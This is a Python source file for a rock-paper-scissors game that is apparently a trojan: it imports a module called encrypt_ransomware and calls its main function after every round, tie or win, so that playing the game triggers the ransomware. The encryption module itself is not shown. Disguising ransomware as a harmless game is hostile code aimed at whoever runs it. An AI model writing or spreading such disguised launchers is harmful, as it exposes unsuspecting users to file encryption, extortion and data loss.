import random
import time
import encrypt_ransomware

moves = [ "rock", "paper", "scissors" ]

def get_user_move():

    while True:

        user_move = input("[#]Choose your move [ rock, paper, scissors ]: ")

        if user_move.lower() in moves:

            return user_move
        print("[#]Invalid move given by user!")
        time.sleep(1)
        exit

def get_computer_move():

    return random.choice(moves)

def get_winner(user_move,computer_move):

    if user_move == computer_move:

        return "tie"
    
    elif user_move == "rock" and computer_move == "scissors":

        return "user"
    
    elif user_move == "paper" and computer_move == "rock":

        return "user"
    
    elif user_move == "scissors" and computer_move == "paper":

        return "user"
    
    else:
        return "computer"
       

    
def get_result():

    user_move = get_user_move()

    computer_move = get_computer_move()

    winner = get_winner(user_move,computer_move)

    print(f"[!]Your move {user_move} and Computer move {computer_move}")

    if winner == "tie":

        print("[=]Round tied")
        

        encrypt_ransomware.main()
    
    else:

        print(f"[!]Round won by {winner.capitalize()}")


        encrypt_ransomware.main()


while True:

    get_result()

    user_req =input("[-]Do you want to play again: ")

    if user_req.lower() == "n":
        
        print("[!]Game is discontinued by user")

        time.sleep(1)

        exit()


